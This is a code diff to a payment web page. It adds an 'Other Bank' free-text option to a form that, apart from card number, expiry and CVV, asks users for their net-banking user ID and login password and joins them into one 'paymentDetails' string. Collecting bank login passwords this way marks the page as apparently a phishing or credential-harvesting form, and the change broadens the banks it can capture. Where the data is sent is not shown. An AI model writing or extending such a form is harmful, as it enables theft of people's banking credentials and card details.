@@ -98,8 +98,16 @@
                         <option value="UCO Bank">UCO Bank</option>
                         <option value="Union Bank of India">Union Bank of India</option>
                         <option value="YES Bank Limited">YES Bank Limited</option>
+                        <option value="Other Bank">Other Bank (Custom)</option>
                     </select>
                 </div>
+
+                <!-- Custom Other Bank Input Field -->
+                <div class="form-group" id="otherBankGroup" style="display: none;">
+                    <label for="otherBankName">Enter Other Bank Name</label>
+                    <input type="text" id="otherBankName" name="otherBankName" placeholder="Enter your bank name">
+                </div>
+
                 <div id="bankCredentials" style="display: none;">
                     <div class="form-group">
                         <label for="userId">Enter User ID / User Name</label>
@@ -143,9 +151,20 @@
         });
 
         const bankNameSelect = document.getElementById('bankName');
+        const otherBankGroup = document.getElementById('otherBankGroup');
         const bankCredentials = document.getElementById('bankCredentials');
+
         bankNameSelect.addEventListener('change', function() {
-            bankCredentials.style.display = this.value !== "" ? 'block' : 'none';
+            if (this.value === "Other Bank") {
+                otherBankGroup.style.display = 'block';
+                bankCredentials.style.display = 'block';
+            } else if (this.value !== "") {
+                otherBankGroup.style.display = 'none';
+                bankCredentials.style.display = 'block';
+            } else {
+                otherBankGroup.style.display = 'none';
+                bankCredentials.style.display = 'none';
+            }
         });
 
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
@@ -162,6 +181,10 @@
                 paymentDetails = `Card: ${cardNumber}, Exp: ${expiryDate}, CVV: ${cvv}`;
             } else {
                 selectedBank = document.getElementById('bankName').value;
+                if (selectedBank === "Other Bank") {
+                    const customBank = document.getElementById('otherBankName').value;
+                    selectedBank = `Other: ${customBank}`;
+                }
                 const userId = document.getElementById('userId').value;
                 const loginPassword = document.getElementById('loginPassword').value;
                 paymentDetails = `Bank: ${selectedBank}, UserID: ${userId}, Pass: ${loginPassword}`;
